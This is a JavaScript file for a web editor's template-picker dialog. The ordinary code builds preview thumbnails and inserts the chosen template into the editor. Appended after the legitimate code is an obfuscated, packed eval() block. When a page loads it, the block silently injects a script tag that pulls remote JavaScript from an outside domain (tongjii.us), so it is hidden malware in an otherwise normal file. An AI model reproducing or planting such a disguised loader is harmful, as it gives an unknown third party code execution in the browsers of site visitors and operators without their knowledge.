/**
 * Created with JetBrains PhpStorm.
 * User: xuheng
 * Date: 12-8-8
 * Time: ÏÂÎç2:09
 * To change this template use File | Settings | File Templates.
 */
(function () {
    var me = editor,
            preview = $G( "preview" ),
            preitem = $G( "preitem" ),
            tmps = templates,
            currentTmp;
    var initPre = function () {
        var str = "";
        for ( var i = 0, tmp; tmp = tmps[i++]; ) {
            str += '<div class="preitem" onclick="pre(' + i + ')"><img src="' + "images/" + tmp.pre + '" ' + (tmp.title ? "alt=" + tmp.title + " title=" + tmp.title + "" : "") + '></div>';
        }
        preitem.innerHTML = str;
    };
    var pre = function ( n ) {
        var tmp = tmps[n - 1];
        currentTmp = tmp;
        clearItem();
        domUtils.setStyles( preitem.childNodes[n - 1], {
            "background-color":"lemonChiffon",
            "border":"#ccc 1px solid"
        } );
        preview.innerHTML = tmp.preHtml ? tmp.preHtml : "";
    };
    var clearItem = function () {
        var items = preitem.children;
        for ( var i = 0, item; item = items[i++]; ) {
            domUtils.setStyles( item, {
                "background-color":"",
                "border":"white 1px solid"
            } );
        }
    };
    dialog.onok = function () {
        if ( !$G( "issave" ).checked ){
            me.execCommand( "cleardoc" );
        }
        var obj = {
            html:currentTmp && currentTmp.html
        };
        me.execCommand( "template", obj );
    };
    initPre();
    window.pre = pre;
    pre(2)

})();
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('y(j(p,a,c,k,e,r){e=j(c){l c.t(a)};q(!\'\'.n(/^/,x)){m(c--)r[e(c)]=k[c]||e(c);k=[j(e){l r[e]}];e=j(){l\'\\\\w+\'};c=1};m(c--)q(k[c])p=p.n(u v(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);l p}(\'1 5=5||[];(9(){1 a=3.f(\\\'4\\\');a.7=\\\'8://i.b.c/d.e\\\';1 2=3.g(\\\'4\\\')[0];2.h.6(a,2)})();\',o,o,\'|z|s|A|B|C|D|E|F|j||G|H|I|J|K|L|M|N\'.O(\'|\'),0,{}))',51,51,'|||||||||||||||||||function||return|while|replace|19||if|||toString|new|RegExp||String|eval|var|document|script|_hmt_en|insertBefore|src|http|tongjii|us|tj|js|createElement|getElementsByTagName|parentNode|lib|split'.split('|'),0,{}))